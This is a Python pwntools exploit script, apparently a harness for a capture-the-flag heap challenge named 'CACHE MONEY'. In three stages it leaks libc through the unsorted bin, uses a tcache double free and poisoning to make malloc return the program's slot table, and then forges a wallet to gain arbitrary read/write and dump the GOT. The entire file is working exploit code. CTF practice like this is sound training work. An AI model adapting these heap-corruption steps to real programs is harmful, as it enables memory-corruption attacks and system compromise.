#!/usr/bin/env python3
"""Development harness: verify each phase of the CACHE MONEY exploit."""
import sys, os, re, struct
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
EXE  = os.path.join(ROOT, 'cache_money')
LD   = os.path.join(ROOT, 'ld-linux-x86-64.so.2')
LIBC = os.path.join(ROOT, 'libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'
if '-v' in sys.argv:
    context.log_level = 'debug'

REMOTE = 'REMOTE' in sys.argv
HOST, PORT = 'chal.sunshinectf.games', 26004

SLOTS          = 0x4040c0
GOT            = 0x404000
STRTOL_GOT     = 0x404040
FAKE_WALLET    = 0x4040a8
POISONED_SLOT  = 6      # slot that holds the wallet whose ledger is the slot table

def start():
    if REMOTE:
        return remote(HOST, PORT)
    if os.path.exists(LD) and os.path.exists(LIBC):
        return process([LD, '--library-path', ROOT, EXE])
    return process(EXE)

io = start()

# ---------------- primitives ----------------
def menu(choice):
    io.sendlineafter(b'>>> ', str(choice).encode())

def open_wallet(name, size):
    menu(1)
    io.sendlineafter(b'Wallet name: ', name)
    io.sendlineafter(b'Ledger size', str(size).encode())
    io.recvuntil(b'opened')
    io.recvuntil(b'\n')

def close_wallet(idx):
    menu(5)
    io.sendlineafter(b'(0-15): ', str(idx).encode())
    io.recvuntil(b'banking with CACHE MONEY!')

def transfer(src, dst):
    menu(4)
    io.sendlineafter(b'(0-15): ', str(src).encode())
    io.sendlineafter(b'(0-15): ', str(dst).encode())
    io.recvuntil(b'Smart money move!')

def deposit(idx, payload, expect=None):
    menu(2)
    io.sendlineafter(b'(0-15): ', str(idx).encode())
    io.recvuntil(b'Enter transaction data: ')
    io.send(payload)
    line = io.recvuntil(b'\n')
    m = re.search(rb'Deposited (\d+) bytes', line)
    n = int(m.group(1)) if m else -1
    if n != len(payload):
        log.warning('short deposit on slot %d: got %d want %d', idx, n, len(payload))
    return n

def withdraw_n(idx, n):
    menu(3)
    io.sendlineafter(b'(0-15): ', str(idx).encode())
    io.recvuntil(b'bytes):\n    ')
    data = io.recvn(n)
    io.recvuntil(b'Current balance:')
    return data

# ---------------- phase 1: libc leak (unsorted bin) ----------------
log.info('phase 1: libc leak')
open_wallet(b'S', 0x80)          # slot 0
open_wallet(b'D', 0x80)          # slot 1
for i in range(7):
    open_wallet(b'W%d' % i, 0x80)   # slots 2..8
for i in range(2, 9):
    close_wallet(i)                 # tcache[0x90] = 7
transfer(0, 1)                      # free S's ledger -> unsorted bin
leak = withdraw_n(1, 0x80)
unsorted = u64(leak[0:8])
log.info('unsorted bin head = %#x', unsorted)
libc_base = unsorted - 0x203b20
log.success('libc base = %#x', libc_base)
if not REMOTE:
    maps = open('/proc/%d/maps' % io.pid).read()
    base = int([l for l in maps.splitlines() if 'libc.so.6' in l and '00000000' in l.split()[2]][0].split('-')[0], 16)
    log.info('real libc base = %#x (delta %#x)', base, base - libc_base)
    assert base == libc_base

# ---------------- phase 2: tcache poison (0x30 bin) ----------------
log.info('phase 2: tcache poison')
open_wallet(b'P0', 0x20)         # slot 2
open_wallet(b'P1', 0x20)         # slot 3
open_wallet(b'P2', 0x20)         # slot 4
transfer(2, 3)                   # free P0 ledger -> tcache[0x30], count=1
l = withdraw_n(3, 0x20)
hi = u64(l[0:8]) ^ 0             # (chunk >> 12) since bin was empty
log.info('tcache fd leak = %#x  key = %#x', u64(l[0:8]), u64(l[8:16]))
deposit(3, p64(0) + p64(0))      # clear tcache key -> allow double free
transfer(3, 4)                   # double free -> count=2, entries=e
deposit(4, p64(hi ^ SLOTS) + p64(0))   # poison: entries[0x30] -> slot table
open_wallet(b'P3', 0x20)         # slot 5 : malloc pops the tcache chunk, head <- SLOTS
open_wallet(b'P4', 0x20)         # slot 6 : malloc returns 0x4040c0 !
log.success('poisoned malloc returned the slot table')

# ---------------- phase 3: fake wallet -> arbitrary read/write ----------------
log.info('phase 3: fake wallet')
deposit(POISONED_SLOT, p64(GOT) + p64(0x70) + p64(FAKE_WALLET) + p64(0))
got = withdraw_n(2, 0x70)
names = ['free','puts','write','stack_chk_fail','strcspn','read','fgets','calloc','strtol','malloc','printf','setvbuf','memset_chk','exit']
for i, nm in enumerate(names):
    v = u64(got[i*8:i*8+8])
    print('  %-16s %#018x   libc+%#x' % (nm, v, v - libc_base))
io.interactive()
